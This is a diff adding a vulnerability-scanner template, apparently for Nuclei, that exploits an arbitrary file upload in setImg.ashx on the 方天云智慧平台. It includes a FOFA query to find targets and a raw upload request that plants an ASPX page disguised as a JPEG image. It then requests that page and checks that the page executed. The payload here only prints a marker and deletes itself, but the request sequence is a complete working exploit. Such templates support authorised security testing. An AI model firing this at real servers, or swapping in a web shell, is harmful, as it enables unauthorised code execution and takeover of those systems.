@@ -1,0 +1,49 @@
+id: fangtianyunzhihui-setImg_ashx-File-upload
+
+info:
+  name: 方天云智慧平台系统 setImg.ashx 任意文件上传
+  author: HuanXiong
+  severity: high
+  description: |-
+    fofa: body="AjaxMethods.asmx/GetCompanyItem"
+
+  tags: File Upload
+  
+http:
+  - raw:
+      - |
+        POST /Data/setImg.ashx HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:99.0) Gecko/20100101 Firefox/99.0
+        X-Requested-With: XMLHttpRequest
+        Content-Type: multipart/form-data; boundary=----21909179191068471382830692394
+
+        ------21909179191068471382830692394
+        Content-Disposition: form-data; name="Filedata"; filename="test.aspx"
+        Content-Type: image/jpeg
+
+        <%@Page Language="C#"%><%Response.Write("pboyjnnrfipmplsukdeczudsefxmywe");System.IO.File.Delete(Request.PhysicalPath);%>
+        ------21909179191068471382830692394--
+      
+      - |
+        GET /UploadFile/CustomerFile/{{uploadfile}} HTTP/1.1
+        Host: {{Hostname}}
+
+    extractors:
+       - type: regex 
+         part: body
+         name: uploadfile
+         group: 1
+         regex:
+            - '(\d+/\d+/\d+/\d+/[a-zA-Z0-9-]+\.aspx)'
+         internal: true
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - 'pboyjnnrfipmplsukdeczudsefxmywe'
+      - type: status
+        status: 
+          - 200
